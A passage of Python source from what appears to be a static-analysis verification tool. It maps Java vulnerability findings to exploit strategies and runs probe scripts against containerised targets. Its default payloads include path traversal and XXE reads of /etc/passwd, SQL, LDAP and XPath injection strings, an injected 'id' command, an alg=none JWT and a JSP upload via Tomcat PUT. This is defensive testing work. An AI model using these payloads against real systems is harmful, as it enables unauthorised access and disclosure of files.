                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self.tools._get_image_exposed_ports(self._select_project_image(project_path, "sast-target:latest"))[0] if self.tools._get_image_exposed_ports(self._select_project_image(project_path, "sast-target:latest")) else 8080),
                "target_path": route_info["path"],
                "method": "GET",
                "source_file": str(java_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
            }
        return None

    def _detect_java_auth_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            content = java_file.read_text(encoding="utf-8", errors="ignore")
            if not re.search(r'permitAll|anonymous|@PreAuthorize|@Secured|@RolesAllowed|@GetMapping|@PostMapping|@RequestMapping', content, re.IGNORECASE):
                continue
            route_info = self._find_first_java_route_in_lines(content.splitlines()) or self._find_first_java_route(project_path)
            return {
                "exploit_family": "java_auth_bypass",
                "image": self._select_project_image(project_path, "sast-target:latest"),
                "container_port": str(self.tools._get_image_exposed_ports(self._select_project_image(project_path, "sast-target:latest"))[0] if self.tools._get_image_exposed_ports(self._select_project_image(project_path, "sast-target:latest")) else 8080),
                "target_path": route_info["path"],
                "method": route_info.get("method", "GET"),
                "source_file": str(java_file.relative_to(project_path)).replace("/", "\\"),
                "source_line": str(vulnerability.get("line", 0) or 0),
                "business_goal": "绕过当前项目中的认证或角色边界，验证未授权请求是否能直接访问受保护入口。",
                "input_role": "认证态 / 角色判定输入",
                "delivery_shape": "HTTP 头、Cookie 或默认匿名请求",
                "trigger_condition": "单次请求即可验证权限边界是否生效。",
                "verification_signal_hint": "成功信号是应受限资源被未授权访问，而不是仅返回普通公开页面。",
                "business_context": f"从 {java_file.name} 中识别到权限注解或 permitAll 配置，目标入口为 {route_info.get('method', 'GET')} {route_info['path']}。",
                "attack_steps_json": json.dumps([
                    f"在不提供有效认证态的情况下访问 {route_info['path']}。",
                    "观察服务端是否仍返回受保护资源，而不是 401/403。",
                    "确认拿到的不是公开页，而是原本应受限的业务能力。",
                ], ensure_ascii=False),
            }
        return None

    def _detect_java_hpp_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'getParameterValues|getParameters|MultiValueMap', line):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                direct_param = re.search(r'getParameterValues\s*\(\s*"([^"]+)"\)|getParameter\s*\(\s*"([^"]+)"\)', line)
                param_name = (direct_param.group(1) or direct_param.group(2)) if direct_param else self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "id"
                if route_info:
                    return {
                        "exploit_family": "java_hpp",
                        "image": selected_image,
                        "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                        "target_path": route_info["path"],
                        "parameter": param_name,
                        "method": route_info["method"],
                        "baseline": "1",
                        "payload1": "1",
                        "payload2": "2",
                        "source_file": rel_path,
                        "source_line": str(selected_line),
                    }
        return None

    def _detect_java_mongo_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'MongoCollection|BasicDBObject|Document\.parse|MongoTemplate', line, re.IGNORECASE):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "q"
                if route_info:
                    return {
                        "exploit_family": "java_mongo_injection",
                        "image": selected_image,
                        "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                        "target_path": route_info["path"],
                        "parameter": param_name,
                        "method": route_info["method"],
                        "baseline": "guest",
                        "payload": "{\"$ne\":null}",
                        "expected": "",
                        "source_file": rel_path,
                        "source_line": str(selected_line),
                    }
        return None

    def _detect_java_redis_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            request_prefix = ""
            for idx, line in enumerate(lines, 1):
                if "@RequestMapping" in line:
                    match = re.search(r'@RequestMapping\("([^"]+)"\)', line)
                    if match:
                        request_prefix = match.group(1).rstrip("/")
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'Jedis|RedisTemplate|StringRedisTemplate|opsForValue', line, re.IGNORECASE):
                    continue
                route_info = self._find_route_for_line(lines, idx, request_prefix)
                param_name = self._extract_request_param_name(self._find_enclosing_signature(lines, idx)) or "key"
                if route_info:
                    return {
                        "exploit_family": "java_redis_injection",
                        "image": selected_image,
                        "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                        "target_path": route_info["path"],
                        "parameter": param_name,
                        "method": route_info["method"],
                        "baseline": "safe",
                        "payload": "*",
                        "expected": "",
                        "source_file": rel_path,
                        "source_line": str(selected_line),
                    }
        return None

    def _detect_java_path_strategy(self, project_path: Path, vulnerability: Dict) -> Optional[Dict[str, str]]:
        selected_line = int(vulnerability.get("line", 0) or 0)
        selected_image = self._select_project_image(project_path, "sast-target:latest")
        for java_file in self._find_target_files(project_path, vulnerability, [".java"]):
            rel_path = str(java_file.relative_to(project_path)).replace("/", "\\")
            lines = java_file.read_text(encoding="utf-8", errors="ignore").splitlines()
            current_signature = self._find_enclosing_signature(lines, selected_line) if lines else ""
            method_match = re.search(r'(\w+)\s*\(', current_signature)
            method_name = method_match.group(1) if method_match else "readFile"

            for idx, line in enumerate(lines, 1):
                if idx < selected_line - 10 or idx > selected_line + 10:
                    continue
                if not re.search(r'Files\.readAllBytes|Files\.readString|new\s+FileReader|Paths\.get', line):
                    continue
                for caller_file in project_path.rglob("*.java"):
                    caller_lines = caller_file.read_text(encoding="utf-8", errors="ignore").splitlines()
                    caller_prefix = ""
                    for caller_idx, caller_line in enumerate(caller_lines, 1):
                        if "@RequestMapping" in caller_line:
                            match = re.search(r'@RequestMapping\("([^"]+)"\)', caller_line)
                            if match:
                                caller_prefix = match.group(1).rstrip("/")
                        if method_name not in caller_line:
                            continue
                        route_info = self._find_route_for_line(caller_lines, caller_idx, caller_prefix)
                        param_name = self._extract_request_param_name(self._find_enclosing_signature(caller_lines, caller_idx)) or "file"
                        if route_info:
                            return {
                                "exploit_family": "java_path_traversal",
                                "image": selected_image,
                                "container_port": str(self.tools._get_image_exposed_ports(selected_image)[0] if self.tools._get_image_exposed_ports(selected_image) else 8080),
                                "target_path": route_info["path"],
                                "parameter": param_name,
                                "method": route_info["method"],
                                "payload": "../../../../etc/passwd",
                                "expected": "root:",
                                "source_file": rel_path,
                                "source_line": str(selected_line),
                            }
        return None

    def _verify_thymeleaf_ssti_chain(self, strategy: Dict[str, str]) -> VerificationResult:
        project_path = Path(self.tools.runtime_context.get("project_path", Path.cwd()))
        strategy = self._ensure_strategy_semantics(strategy)
        for key, value in self._derive_project_specific_semantics(project_path, strategy).items():
            if value:
                strategy[key] = value
        script_path = Path.cwd() / "tools" / "exploits" / "java_thymeleaf_ssti_probe.py"
        if not script_path.exists():
            return VerificationResult(
                exploitable=False,
                confidence="low",
                reason="缺少 java_thymeleaf_ssti_probe.py 利用器",
                evidence=[str(script_path)],
                poc_type="java-thymeleaf-ssti",
                poc_code="",
                steps_executed=0,
                raw_output=json.dumps({"semantic_context": self._build_semantic_context_from_strategy(strategy)}, ensure_ascii=False),
            )

        host_port = self._get_available_host_port(18080)
        cmd = [
            sys.executable,
            str(script_path),
            "--image", strategy.get("image", "sast-target:latest"),
            "--container-port", strategy.get("container_port", "8080"),
            "--host-port", str(host_port),
            "--probe-path", strategy.get("probe_path", "/"),
            "--render-path", strategy.get("render_path", "/"),
            "--parameter", strategy.get("parameter", "view"),
            "--method", strategy.get("method", "GET"),
            "--payload", strategy.get("payload", "${7*7}"),
            "--expected", strategy.get("expected", "49"),
            "--output-label", _sanitize_label_local(f"java_thymeleaf_ssti_{Path(strategy.get('source_file', 'target')).stem}_{strategy.get('source_line', 'na')}"),
        ]

        raw_steps = [{"step": "run_exploit_script", "command": cmd}]
        try:
            proc = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=240,
                cwd=str(Path.cwd()),
                env=self._docker_env(),
            )
        except Exception as exc:
            return VerificationResult(
                exploitable=False,
                confidence="low",
                reason="执行 Thymeleaf SSTI 利用器失败",
                evidence=[str(exc)],
                poc_type="java-thymeleaf-ssti",
                poc_code="",
                steps_executed=1,
                raw_output=json.dumps({"steps": raw_steps, "error": str(exc), "semantic_context": self._build_semantic_context_from_strategy(strategy)}, ensure_ascii=False),
            )

        stdout = proc.stdout.decode("utf-8", errors="ignore").strip()
        stderr = proc.stderr.decode("utf-8", errors="ignore").strip()
        raw_steps.append({"step": "script_output", "stdout": stdout, "stderr": stderr, "returncode": proc.returncode})

        try:
            script_result = json.loads(stdout) if stdout else {}
        except Exception:
            script_result = {}

        result_file = Path(script_result.get("result_file", ""))
        exploit_result = {}
        if result_file.exists():
            try:
                exploit_result = json.loads(result_file.read_text(encoding="utf-8"))
            except Exception:
                exploit_result = {}

        success = bool(script_result.get("success")) and bool(exploit_result.get("success"))
        service_url = exploit_result.get("base_url", script_result.get("base_url", ""))
        attack_request = exploit_result.get("attack_request", {})
        attack_result = exploit_result.get("attack_result", {})
        container_id = exploit_result.get("container_id", script_result.get("container_id", ""))

        evidence = [
            f"D2 服务地址: {service_url}",
            f"探测路径: {strategy.get('render_path', '')}",
            f"参数: {strategy.get('parameter', '')}",
            f"响应状态码: {attack_result.get('status_code', '')}",
            f"响应体片段: {str(attack_result.get('body', ''))[:200]}",
        ]

        poc_code = (
            f"1. 启动容器并等待服务就绪\n"
            f"2. 向 {strategy.get('render_path', '')} 发送 {strategy.get('method', 'GET')} 请求\n"
            f"3. 参数 {strategy.get('parameter', '')} 注入 {strategy.get('payload', '${7*7}')}\n"
            f"4. 观察响应中是否出现 {strategy.get('expected', '49')}"
        )

        return VerificationResult(
            exploitable=success,
            confidence="high" if success else "medium",
            reason="已通过 Thymeleaf 表达式注入探测验证响应回显" if success else "Thymeleaf 探测已执行，但未观察到预期表达式结果",
            evidence=evidence,
            poc_type="java-thymeleaf-ssti",
            poc_code=poc_code,
            fix_suggestion="避免将用户输入直接作为 Thymeleaf 模板名、模板内容或表达式处理；禁止不可信输入进入 TemplateEngine.process",
            steps_executed=len(raw_steps),
            raw_output=json.dumps(
                {
                    "steps": raw_steps,
                    "service_url": service_url,
                    "container_id": container_id,
                    "result_file": str(result_file) if result_file else "",
                    "exploit_result": exploit_result,
                    "attack_request": attack_request,
                    "attack_result": attack_result,
                    "semantic_context": self._build_semantic_context_from_strategy(strategy),
                },
                ensure_ascii=False,
            ),
        )

    def _verify_java_fastjson_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_fastjson_probe.py",
            poc_type="java-fastjson",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--method", strategy.get("method", "POST"),
                "--payload", strategy.get("payload", '{"@type":"java.util.HashMap","a3":"49"}'),
                "--expected", strategy.get("expected", "49"),
            ],
            success_reason="已通过 Java Fastjson 探测脚本观察到可控解析结果",
            fail_reason="Java Fastjson 探测已执行，但未观察到预期解析结果",
            fix_suggestion="避免对不可信输入直接使用 Fastjson 解析，并禁用 AutoType 支持",
        )

    def _verify_java_sqli_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_sqli_probe.py",
            poc_type="java-sqli",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "id"),
                "--method", strategy.get("method", "GET"),
                "--baseline", strategy.get("baseline", "1"),
                "--payload", strategy.get("payload", "' OR '1'='1"),
                "--expected", strategy.get("expected", ""),
            ],
            success_reason="Java SQL injection probe observed a meaningful difference between baseline and injected responses",
            fail_reason="Java SQL injection probe ran but did not confirm injection success",
            fix_suggestion="Use PreparedStatement or ORM parameter binding instead of concatenating request data into SQL statements",
        )

    def _verify_java_reflected_xss_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="reflected_xss_probe.py",
            poc_type="java-reflected-xss",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "q"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "<svg/onload=alert(1)>"),
                "--expected", strategy.get("expected", "<svg/onload=alert(1)>"),
            ],
            success_reason="Java reflected XSS probe observed the payload reflected without output encoding",
            fail_reason="Java reflected XSS probe ran but did not confirm unescaped payload reflection",
            fix_suggestion="Apply context-aware output encoding and avoid writing request-controlled HTML directly to the response body",
        )

    def _verify_java_command_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="node_command_injection_probe.py",
            poc_type="java-command-injection",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "command"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "echo test && id"),
                "--expected", strategy.get("expected", "uid="),
            ],
            success_reason="Java 命令注入探测脚本已观察到系统命令执行回显",
            fail_reason="Java 命令注入探测已执行，但未观察到预期命令执行回显",
            fix_suggestion="避免将 HTTP 输入直接拼接到 ProcessBuilder/Runtime.exec；改用固定命令和严格白名单参数",
        )

    def _verify_java_ssrf_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="node_ssrf_probe.py",
            poc_type="java-ssrf",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "url"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "http://127.0.0.1:80"),
                "--expected", strategy.get("expected", "127.0.0.1"),
            ],
            success_reason="Java SSRF probe observed server-side fetching behavior with a request-controlled URL",
            fail_reason="Java SSRF probe ran but did not confirm a server-side fetch to the supplied URL",
            fix_suggestion="Do not fetch arbitrary user-supplied URLs; enforce strict allowlists, block internal addresses, and separate fetch logic from raw request input",
        )

    def _verify_java_xxe_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_xml_probe.py",
            poc_type="java-xxe",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--method", strategy.get("method", "POST"),
                "--transport", strategy.get("transport", "body"),
                "--parameter", strategy.get("parameter", "xml"),
                "--payload", strategy.get("payload", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
                "--expected", strategy.get("expected", "root:"),
            ],
            success_reason="Java XXE probe observed XML entity expansion or sensitive file disclosure",
            fail_reason="Java XXE probe ran but did not confirm external entity expansion",
            fix_suggestion="Disable external entities and DTD processing on XML parsers before parsing untrusted XML",
        )

    def _verify_java_xpath_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_xpath_probe.py",
            poc_type="java-xpath",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "name"),
                "--method", strategy.get("method", "GET"),
                "--baseline", strategy.get("baseline", "guest"),
                "--payload", strategy.get("payload", "' or '1'='1"),
                "--expected", strategy.get("expected", ""),
            ],
            success_reason="Java XPath probe observed a meaningful difference between baseline and injected responses",
            fail_reason="Java XPath probe ran but did not confirm XPath injection success",
            fix_suggestion="Never concatenate request data into XPath expressions; bind values safely or use fixed queries with strict input validation",
        )

    def _verify_java_template_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        script_args = [
            "--target-path", strategy.get("render_path", "/"),
            "--parameter", strategy.get("parameter", "name"),
            "--method", strategy.get("method", "GET"),
            "--payload", strategy.get("payload", "${7*7}"),
            "--expected", strategy.get("expected", "49"),
        ]
        extra_high_payloads = list(strategy.get("high_impact_payloads") or [])
        extra_high_expecteds = list(strategy.get("high_impact_expecteds") or [])
        extra_high_goals = list(strategy.get("high_impact_goals") or [])
        if extra_high_payloads:
            for idx, payload in enumerate(extra_high_payloads):
                if payload == strategy.get("payload", ""):
                    continue
                script_args.extend(["--extra-high-payload", str(payload)])
                expected = ""
                if idx < len(extra_high_expecteds):
                    expected = str(extra_high_expecteds[idx] or "")
                script_args.extend(["--extra-high-expected", expected])
                goal = ""
                if idx < len(extra_high_goals):
                    goal = str(extra_high_goals[idx] or "")
                script_args.extend(["--extra-high-goal", goal])
        if strategy.get("fallback_payload"):
            script_args.extend([
                "--fallback-payload", strategy.get("fallback_payload", ""),
                "--fallback-expected", strategy.get("fallback_expected", strategy.get("expected", "49")),
            ])
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_expression_probe.py",
            poc_type=str(strategy.get("poc_type", "java-freemarker-ssti")),
            script_args=script_args,
            success_reason="Java template expression probe observed evaluated output from a request-controlled expression",
            fail_reason="Java template expression probe ran but did not confirm expression evaluation",
            fix_suggestion="Do not render user-controlled template content or expressions directly; use fixed templates, safe model binding, and disable expression evaluation where possible",
        )

    def _verify_java_ognl_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_expression_probe.py",
            poc_type="java-ognl",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "expr"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "%{7*7}"),
                "--expected", strategy.get("expected", "49"),
            ],
            success_reason="Java OGNL probe observed evaluated expression output from request-controlled input",
            fail_reason="Java OGNL probe ran but did not confirm expression evaluation",
            fix_suggestion="Do not pass request-controlled content into OGNL evaluators or Struts expression contexts",
        )

    def _verify_java_jndi_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_jndi_probe.py",
            poc_type="java-jndi",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "name"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "ldap://127.0.0.1:1389/a3"),
                "--expected", strategy.get("expected", "ldap://127.0.0.1:1389/a3"),
            ],
            success_reason="Java JNDI probe observed attacker-controlled naming input reaching lookup handling",
            fail_reason="Java JNDI probe ran but did not confirm externally controlled lookup behavior",
            fix_suggestion="Do not feed request-controlled values into InitialContext.lookup and related JNDI naming APIs",
        )

    def _verify_java_ldap_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_ldap_probe.py",
            poc_type="java-ldap",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "username"),
                "--method", strategy.get("method", "GET"),
                "--baseline", strategy.get("baseline", "guest"),
                "--payload", strategy.get("payload", "*)(|(uid=*))"),
                "--expected", strategy.get("expected", ""),
            ],
            success_reason="Java LDAP probe observed a meaningful difference between baseline and injected filters",
            fail_reason="Java LDAP probe ran but did not confirm LDAP injection success",
            fix_suggestion="Do not concatenate request data into LDAP filters; escape filter meta characters and use fixed templates",
        )

    def _verify_java_jackson_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_jackson_probe.py",
            poc_type="java-jackson",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--method", strategy.get("method", "POST"),
                "--payload", strategy.get("payload", '{"a3":"49","role":"admin"}'),
                "--expected", strategy.get("expected", "49"),
            ],
            success_reason="Java Jackson probe observed request-controlled JSON being deserialized with attacker-controlled content",
            fail_reason="Java Jackson probe ran but did not confirm unsafe Jackson deserialization",
            fix_suggestion="Disable dangerous polymorphic typing and avoid deserializing untrusted JSON into arbitrary object graphs",
        )

    def _verify_java_xstream_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_xml_probe.py",
            poc_type="java-xstream",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--method", strategy.get("method", "POST"),
                "--transport", strategy.get("transport", "body"),
                "--parameter", strategy.get("parameter", "xml"),
                "--payload", strategy.get("payload", "<map><entry><string>a3</string><string>49</string></entry></map>"),
                "--expected", strategy.get("expected", "49"),
            ],
            success_reason="Java XStream probe observed attacker-controlled XML reaching XStream deserialization logic",
            fail_reason="Java XStream probe ran but did not confirm unsafe XML deserialization",
            fix_suggestion="Apply strict XStream type allowlists and avoid fromXML on untrusted request content",
        )

    def _verify_java_jwt_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_jwt_probe.py",
            poc_type="java-jwt",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "token"),
                "--method", strategy.get("method", "GET"),
                "--header-name", strategy.get("header_name", ""),
                "--payload", strategy.get("payload", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJhMyI6IjQ5In0."),
                "--expected", strategy.get("expected", "admin"),
            ],
            success_reason="已通过 Java JWT 探测脚本观察到弱 JWT 被服务端接受",
            fail_reason="Java JWT 探测已执行，但未观察到预期 JWT 绕过结果",
            fix_suggestion="禁止接受 alg=none 或关闭签名校验，强制限制允许算法并校验签名",
        )

    def _verify_java_csp_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_csp_probe.py",
            poc_type="java-csp",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
            ],
            success_reason="已通过 Java CSP 探测脚本观察到缺失或过宽的 CSP 响应头",
            fail_reason="Java CSP 探测已执行，未观察到缺失或明显过宽的 CSP 响应头",
            fix_suggestion="配置严格的 Content-Security-Policy，避免 unsafe-inline/unsafe-eval 和全通配符来源",
        )

    def _verify_java_cors_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_header_probe.py",
            poc_type="java-cors",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--probe-type", "cors",
            ],
            success_reason="Java CORS probe observed an attacker-controlled origin being allowed",
            fail_reason="Java CORS probe ran but did not confirm permissive cross-origin access",
            fix_suggestion="Restrict allowed origins to explicit trusted domains and avoid combining wildcard origins with credentials",
        )

    def _verify_java_open_redirect_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="node_open_redirect_probe.py",
            poc_type="java-open-redirect",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "next"),
                "--method", strategy.get("method", "GET"),
                "--payload", strategy.get("payload", "https://example.com/a3"),
                "--expected", strategy.get("expected", "https://example.com/a3"),
            ],
            success_reason="Java open redirect probe observed attacker-controlled redirect targets",
            fail_reason="Java open redirect probe ran but did not confirm redirect target control",
            fix_suggestion="Restrict redirect destinations to internal routes or allowlisted domains before issuing redirects or Location headers",
        )

    def _verify_java_cookie_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_header_probe.py",
            poc_type="java-cookie",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--probe-type", "cookie",
            ],
            success_reason="Java cookie probe observed missing Secure/HttpOnly protections on issued cookies",
            fail_reason="Java cookie probe ran but did not confirm weak cookie flags",
            fix_suggestion="Set Secure, HttpOnly and SameSite on all security-sensitive cookies",
        )

    def _verify_java_auth_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_header_probe.py",
            poc_type="java-auth-bypass",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--probe-type", "auth",
            ],
            success_reason="Java auth probe accessed a supposedly protected endpoint without authentication",
            fail_reason="Java auth probe ran but the endpoint still enforced authentication",
            fix_suggestion="Require authentication and authorization checks on sensitive endpoints instead of allowing anonymous access",
        )

    def _verify_java_hpp_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_hpp_probe.py",
            poc_type="java-hpp",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "id"),
                "--method", strategy.get("method", "GET"),
                "--baseline", strategy.get("baseline", "1"),
                "--payload1", strategy.get("payload1", "1"),
                "--payload2", strategy.get("payload2", "2"),
            ],
            success_reason="Java HPP probe observed duplicate parameters changing backend behavior",
            fail_reason="Java HPP probe ran but did not confirm duplicate parameter impact",
            fix_suggestion="Reject duplicate sensitive parameters and normalize request parameters before using them in downstream logic",
        )

    def _verify_java_mongo_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_sqli_probe.py",
            poc_type="java-mongo",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "q"),
                "--method", strategy.get("method", "GET"),
                "--baseline", strategy.get("baseline", "guest"),
                "--payload", strategy.get("payload", "{\"$ne\":null}"),
                "--expected", strategy.get("expected", ""),
            ],
            success_reason="Java Mongo probe observed a meaningful difference between baseline and injected query responses",
            fail_reason="Java Mongo probe ran but did not confirm query manipulation",
            fix_suggestion="Avoid building Mongo queries from raw request input and reject operator objects like $ne/$regex from users",
        )

    def _verify_java_redis_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="generic_sqli_probe.py",
            poc_type="java-redis",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--parameter", strategy.get("parameter", "key"),
                "--method", strategy.get("method", "GET"),
                "--baseline", strategy.get("baseline", "safe"),
                "--payload", strategy.get("payload", "*"),
                "--expected", strategy.get("expected", ""),
            ],
            success_reason="Java Redis probe observed request-controlled Redis key/command behavior differences",
            fail_reason="Java Redis probe ran but did not confirm Redis command/key manipulation",
            fix_suggestion="Use fixed Redis commands and validated key patterns instead of deriving keys or commands directly from request input",
        )

    def _verify_java_tomcat_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_tomcat_probe.py",
            poc_type="java-tomcat",
            script_args=[
                "--put-path", strategy.get("put_path", "/a3-test.jsp"),
                "--verify-path", strategy.get("verify_path", "/a3-test.jsp"),
                "--content", strategy.get("content", "<% out.print(49); %>"),
                "--expected", strategy.get("expected", "49"),
            ],
            success_reason="已通过 Java Tomcat 探测脚本观察到危险 PUT 写入与访问结果",
            fail_reason="Java Tomcat 探测已执行，但未观察到危险 PUT 写入结果",
            fix_suggestion="关闭 Tomcat 默认 Servlet 的危险写入能力，禁止 readonly=false，避免暴露可写静态路径",
        )

    def _verify_java_file_upload_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        return self._run_node_probe_script(
            project_path=project_path,
            strategy=strategy,
            script_name="java_file_upload_probe.py",
            poc_type="java-file-upload",
            script_args=[
                "--target-path", strategy.get("target_path", "/"),
                "--field-name", strategy.get("field_name", "file"),
                "--filename", strategy.get("filename", "a3-test.jsp"),
                "--content", strategy.get("content", "<% out.print(49); %>"),
                "--expected", strategy.get("expected", "ok"),
            ],
            success_reason="已通过 Java 文件上传探测脚本观察到上传请求被服务端接收",
            fail_reason="Java 文件上传探测已执行，但未观察到预期上传结果",
            fix_suggestion="限制上传目录、扩展名、类型和可执行权限，不要直接使用原始文件名落地",
        )

